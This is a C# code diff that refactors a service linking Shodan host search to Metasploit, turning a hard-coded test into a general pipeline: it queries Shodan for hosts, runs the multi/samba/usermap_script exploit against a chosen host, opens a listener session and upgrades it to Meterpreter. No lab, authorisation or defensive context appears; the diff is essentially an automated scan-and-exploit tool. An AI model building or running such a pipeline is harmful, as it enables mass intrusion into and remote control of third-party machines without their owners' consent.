@@ -28,29 +28,34 @@ namespace Lacey.Alexa.Explorer.Services.Services.Concrete
             _logger = logger;
         }
 
-        public async Task Run()
+        public async Task FindVulnerableHosts()
+        {
+        }
+
+        public async Task<string[]> QueryHosts(string query)
         {
             await _shodanLogin.Login();
             if (!_shodanLogin.IsAuthenticated())
             {
-                return;
+                return new string[]{};
             }
 
-            var hosts = await _shodan.GetHosts("city:miami os:windows");
-            return;
+            return await _shodan.GetHosts(query);
+        }
 
+        public async Task ExploitHost(string host)
+        {
             await _metasploit.Login();
             if (!_metasploit.IsAuthenticated())
             {
                 return;
             }
 
-            const string rHost = "192.168.0.14";
             const string exploit = "multi/samba/usermap_script";
 
             _logger.LogTrace("Starting listener...");
             var result = await _metasploit.MultiHandler();
-            await _metasploit.Exploit(exploit, rHost);
+            await _metasploit.Exploit(exploit, host);
 
             _logger.LogTrace("Obtaining session...");
             var sessionId = await _metasploit.ObtainSession(exploit, result.JobId);
@@ -58,7 +63,7 @@ namespace Lacey.Alexa.Explorer.Services.Services.Concrete
             _logger.LogTrace("Upgrading session to Meterpreter...");
             var meterpreterId = await _metasploit.ObtainMeterpreter(sessionId);
             await _metasploit.Meterpreter(meterpreterId);
-            
+
             _logger.LogTrace("Closing session...");
             await _metasploit.StopSession(sessionId);
         }
